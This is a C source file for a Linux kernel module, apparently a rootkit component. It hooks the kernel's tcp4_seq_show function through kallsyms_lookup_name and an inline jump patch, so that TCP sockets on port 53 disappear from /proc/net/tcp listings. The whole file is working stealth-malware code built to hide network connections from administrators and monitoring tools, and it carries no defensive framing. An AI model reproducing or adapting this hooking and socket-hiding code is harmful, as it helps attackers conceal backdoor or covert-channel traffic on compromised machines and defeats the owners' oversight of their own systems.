#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <net/sock.h>
#include <net/ip.h>
#include "hook.c"


#define PORT_TO_HIDE 53
#define TMPSZ 150

typedef unsigned long psize;

psize *o_tcp4_seq_show;
unsigned char* tcp_original_code;

typedef int (*tcp4_seq_show_t)(struct seq_file *seq, void *v);

int my_tcp4_seq_show(struct seq_file *seq, void *v) {

	(psize *) o_tcp4_seq_show;

	seq_setwidth(seq, TMPSZ - 1);

	if (v == SEQ_START_TOKEN) {
		seq_puts(seq, "  sl  local_address rem_address   st tx_queue "
			   "rx_queue tr tm->when retrnsmt   uid  timeout "
			   "inode");
		seq_pad(seq, '\n');	
		return 0;
	}

	struct sock *sk = v;
	struct inet_sock *inet = inet_sk(sk);

	if (ntohs(inet->inet_dport) == PORT_TO_HIDE || ntohs(inet->inet_sport) == PORT_TO_HIDE ) {
		
		// hiding socket 
		return 0;
	}

	hijack_stop(o_tcp4_seq_show, tcp_original_code);

	tcp4_seq_show_t orignal_function = (tcp4_seq_show_t) o_tcp4_seq_show;
	orignal_function(seq, v);

	hijack_start(o_tcp4_seq_show, my_tcp4_seq_show, &tcp_original_code);

	return 0;
}


int hide_sock(void) 
{
	(psize *) o_tcp4_seq_show;

	// get address of o_tcp4_seq_show function
	o_tcp4_seq_show = (void *)kallsyms_lookup_name("tcp4_seq_show");

	// hijack the o_tcp4_seq_show function so it will JMP to 'my_tcp4_seq_show' function
	hijack_start(o_tcp4_seq_show, my_tcp4_seq_show, &tcp_original_code);
}


int remove_sock_hook(void){

	// remove the hook from the o_tcp4_seq_show function
	hijack_stop(o_tcp4_seq_show, tcp_original_code);
}



